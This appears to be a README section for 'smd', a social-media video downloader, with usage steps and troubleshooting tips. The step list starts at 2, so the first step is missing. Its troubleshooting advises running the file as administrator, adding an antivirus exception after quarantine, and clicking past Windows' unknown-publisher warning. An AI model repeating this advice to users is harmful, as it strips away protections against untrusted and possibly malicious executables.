## 🎯 How To Use smd

Using smd is a three-step loop that you will memorize after one try.

**2. Paste it into smd.** Click the text box at the top of the smd window and paste the link using **Ctrl + V**.

**3. Press Download.** Click the download button. smd will read the link, figure out which platform it belongs to, and start saving the highest-quality version it can find.

When the download finishes, smd will show you the finished file. Click it to open the video, or click the folder icon to jump straight to where it is stored.

**A few tips for a smooth experience:**

- Paste the link to the actual post or video, not to a search results page.

- If a download stalls, cancel it and try again. Occasional hiccups happen on any network.
- Keep smd open while a download is running. Closing the window stops the transfer.

## 🛠️ Troubleshooting

**Nothing happens when I double-click the file.** Right-click the file and choose **Run as administrator**. If that fails, check that your antivirus has not quarantined it — you may need to add an exception.

**The app opens but a download fails.** Copy the link again and make sure it is complete. Links that span multiple lines often get cut off when copied.

**The download is very slow.** Speed depends mostly on the source platform and your connection. Try again at a different time of day, or check whether your antivirus is scanning the download in real time.

**Windows says the publisher is unknown.** This is normal for small independently developed tools. Click **More info → Run anyway**.

**A video saves without sound.** Some platforms serve audio and video separately. Make sure you are using the default quality option rather than a video-only preset.

**The quality looks lower than expected.** Not every post is uploaded in high resolution. smd always saves the best version the platform actually offers.
